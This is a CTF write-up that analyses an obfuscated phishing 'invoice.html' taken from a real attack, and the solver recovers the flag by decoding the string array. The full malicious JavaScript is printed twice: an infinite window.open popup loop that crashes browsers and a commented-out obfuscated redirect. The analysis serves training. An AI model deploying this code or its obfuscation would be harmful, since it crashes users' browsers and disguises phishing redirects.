
danger-Live-and-Malicious-Code
50

Like the title says, this challenge is dangerous and contains live malware.

Shoutout to the hacker that I stole this from challenge from. Sadly I can't give them credit because they sent the phish from a compromised email, but it's literally his/her code. I just defanged it (a little bit - it will still crash your webbrowser (usually, but don't test that outside of a VM)) and stuck a WPI flag in here.

To prevent accidental execution the file has been zipped with the password "I_understand_that_this_challenge_contains_LIVE_MALWARE"

http://us-east-1.linodeobjects.com/wpictf-challenge-files/invoice.zip

made by: The_Abjuri5t (John F.)

flag format: WPI{......}


kali@kali:~/Downloads/wipctf$ wget http://us-east-1.linodeobjects.com/wpictf-challenge-files/invoice.zip
--2020-04-18 16:02:14--  http://us-east-1.linodeobjects.com/wpictf-challenge-files/invoice.zip
Resolving us-east-1.linodeobjects.com (us-east-1.linodeobjects.com)... 173.255.231.96, 45.79.157.59, 96.126.106.143, ...
Connecting to us-east-1.linodeobjects.com (us-east-1.linodeobjects.com)|173.255.231.96|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 729 [application/zip]
Saving to: ‘invoice.zip’

invoice.zip              100%[==================================>]     729  --.-KB/s    in 0s      

2020-04-18 16:02:14 (107 MB/s) - ‘invoice.zip’ saved [729/729]

kali@kali:~/Downloads/wipctf$ unzip invoice.zip 
Archive:  invoice.zip
[invoice.zip] invoice.html password: 
  inflating: invoice.html

kali@kali:~/Downloads/wipctf$ ls -l
total 8
-rw-r--r-- 1 kali kali 1243 Feb 22 22:29 invoice.html
-rw-r--r-- 1 kali kali  729 Apr 14 21:29 invoice.zip

kali@kali:~/Downloads/wipctf$ cat invoice.html 
<html>
<head>
<title></title>
</head>
<body>
<script>var a = ['ps:','cte','5df','se_','toS','ing','tri','sub','lac','ryt','d}.','cod','pro','_no','ran','ing','dom','str','ete','rep'];function abc(def) { popupWindow = window.open( def,'popUpWindow','height=666,width=666,left=666,top=666') }(function(c, d) {var e = function(f) {while (--f) {c['push'](c['shift']());}};e(++d);}(a, 0xa8));var b = function(c, d) {c = c - 0x0;var e = a[c];return e;};var c = 'htt' + b('0xc') + '//t' + b('0x1') + b('0xe') + 'xc-' + 'rWP' + 'I';var d = '{Oh' + b('0x5') + b('0xf') + b('0x4') + b('0x3') + b('0x7') + '_d';var e = b('0xa') + b('0xd') + b('0x2') + 'net' + '/';var f = Math[b('0x6') + b('0x8')]()[b('0x10') + b('0x12') + 'ng'](0x6)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf) + Math['ran' + 'dom']()[b('0x10') + b('0x12') + 'ng'](0x10)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf);var g = Math['ran' + 'dom']()[b('0x10') + b('0x12') + 'ng'](0x24)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf) + Math[b('0x6') + b('0x8')]()['toS' + b('0x12') + 'ng'](0x24)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf);/*location[b('0xb') + b('0x0') + 'e'](c + d + e + '?' + f + '=' + g);*/for(var i=1;i===i;i++){abc(self.location,'_blank');}</script></body>
</html>

kali@kali:~/Downloads/wipctf$ uglifyjs -b
var a = ['ps:','cte','5df','se_','toS','ing','tri','sub','lac','ryt','d}.','cod','pro','_no','ran','ing','dom','str','ete','rep'];function abc(def) { popupWindow = window.open( def,'popUpWindow','height=666,width=666,left=666,top=666') }(function(c, d) {var e = function(f) {while (--f) {c['push'](c['shift']());}};e(++d);}(a, 0xa8));var b = function(c, d) {c = c - 0x0;var e = a[c];return e;};var c = 'htt' + b('0xc') + '//t' + b('0x1') + b('0xe') + 'xc-' + 'rWP' + 'I';var d = '{Oh' + b('0x5') + b('0xf') + b('0x4') + b('0x3') + b('0x7') + '_d';var e = b('0xa') + b('0xd') + b('0x2') + 'net' + '/';var f = Math[b('0x6') + b('0x8')]()[b('0x10') + b('0x12') + 'ng'](0x6)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf) + Math['ran' + 'dom']()[b('0x10') + b('0x12') + 'ng'](0x10)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf);var g = Math['ran' + 'dom']()[b('0x10') + b('0x12') + 'ng'](0x24)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf) + Math[b('0x6') + b('0x8')]()['toS' + b('0x12') + 'ng'](0x24)[b('0x13') + b('0x9') + b('0x11')](0x2, 0xf);/*location[b('0xb') + b('0x0') + 'e'](c + d + e + '?' + f + '=' + g);*/for(var i=1;i===i;i++){abc(self.location,'_blank');}

var a = [ "ps:", "cte", "5df", "se_", "toS", "ing", "tri", "sub", "lac", "ryt", "d}.", "cod", "pro", "_no", "ran", "ing", "dom", "str", "ete", "rep" ];

function abc(def) {
    popupWindow = window.open(def, "popUpWindow", "height=666,width=666,left=666,top=666");
}

(function(c, d) {
    var e = function(f) {
        while (--f) {
            c["push"](c["shift"]());
        }
    };
    e(++d);
})(a, 168);

var b = function(c, d) {
    c = c - 0;
    var e = a[c];
    return e;
};

var c = "htt" + b("0xc") + "//t" + b("0x1") + b("0xe") + "xc-" + "rWP" + "I";

var d = "{Oh" + b("0x5") + b("0xf") + b("0x4") + b("0x3") + b("0x7") + "_d";

var e = b("0xa") + b("0xd") + b("0x2") + "net" + "/";

var f = Math[b("0x6") + b("0x8")]()[b("0x10") + b("0x12") + "ng"](6)[b("0x13") + b("0x9") + b("0x11")](2, 15) + Math["ran" + "dom"]()[b("0x10") + b("0x12") + "ng"](16)[b("0x13") + b("0x9") + b("0x11")](2, 15);

var g = Math["ran" + "dom"]()[b("0x10") + b("0x12") + "ng"](36)[b("0x13") + b("0x9") + b("0x11")](2, 15) + Math[b("0x6") + b("0x8")]()["toS" + b("0x12") + "ng"](36)[b("0x13") + b("0x9") + b("0x11")](2, 15);

for (var i = 1; i === i; i++) {
    abc(self.location, "_blank");
}
kali@kali:~/Downloads/wipctf$


The for loop at the bottom is an infinite loop to create pop-up windows. We definitely don't want to run that.
The other variables look interesting though. The flag is being built from the array of strings on the first line. Let's print them out and see what happens.


kali@kali:~/Downloads/wipctf$ cp invoice.html invoice_mod.html
kali@kali:~/Downloads/wipctf$ vim invoice_mod.html
kali@kali:~/Downloads/wipctf$ cat invoice_mod.html
<html>
<head>
<title></title>
</head>
<body>
<script>
var a = [ "ps:", "cte", "5df", "se_", "toS", "ing", "tri", "sub", "lac", "ryt", "d}.", "cod", "pro", "_no", "ran", "ing", "dom", "str", "ete", "rep" ];

(function(c, d) {
    var e = function(f) {
        while (--f) {
            c["push"](c["shift"]());
        }   
    };  
    e(++d);
})(a, 168);

var b = function(c, d) {
    c = c - 0;
    var e = a[c];
    return e;
};  

var c = "htt" + b("0xc") + "//t" + b("0x1") + b("0xe") + "xc-" + "rWP" + "I";

var d = "{Oh" + b("0x5") + b("0xf") + b("0x4") + b("0x3") + b("0x7") + "_d";

var e = b("0xa") + b("0xd") + b("0x2") + "net" + "/";

var f = Math[b("0x6") + b("0x8")]()[b("0x10") + b("0x12") + "ng"](6)[b("0x13") + b("0x9") + b("0x11")](2, 15) + Math["ran" + "dom"]()[b("0x10") + b("0x12") + "ng"](16)[b("0x13") + b("0x9") + b("0x11")](2, 15);

var g = Math["ran" + "dom"]()[b("0x10") + b("0x12") + "ng"](36)[b("0x13") + b("0x9") + b("0x11")](2, 15) + Math[b("0x6") + b("0x8")]()["toS" + b("0x12") + "ng"](36)[b("0x13") + b("0x9") + b("0x11")](2, 15);

document.write("a: " + a + "<br>\n");
document.write("b: " + b + "<br>\n");
document.write("c: " + c + "<br>\n");
document.write("d: " + d + "<br>\n");
document.write("e: " + e + "<br>\n");
document.write("f: " + f + "<br>\n");
document.write("g: " + g + "<br>\n");
</script>
</body>
</html>


Open invoice_mod.html in firefox and get:


a: lac,ryt,d}.,cod,pro,_no,ran,ing,dom,str,ete,rep,ps:,cte,5df,se_,toS,ing,tri,sub
b: function(c, d) { c = c - 0; var e = a[c]; return e; }
c: https://tryt5dfxc-rWPI
d: {Oh_nose_procoding_d
e: etected}.net/
f: 444423500012190de9ae4937da
g: deygcrb1hmfhgg1r9kty5a


The flag is:

WPI{Oh_nose_procoding_detected}

